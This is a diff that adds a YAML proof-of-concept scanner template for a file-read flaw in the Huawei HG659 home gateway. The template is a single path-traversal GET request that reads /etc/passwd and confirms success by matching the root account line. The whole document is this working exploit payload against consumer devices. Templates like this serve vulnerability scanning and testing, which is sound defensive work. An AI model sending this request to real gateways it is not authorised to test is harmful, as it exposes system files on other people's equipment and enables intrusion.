@@ -1,0 +1,12 @@
+name: poc-yaml-huawei-home-gateway-hg659-fileread
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /lib///....//....//....//....//....//....//....//....//etc//passwd
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: r0()
+detail:
+    links:
+        - https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4210
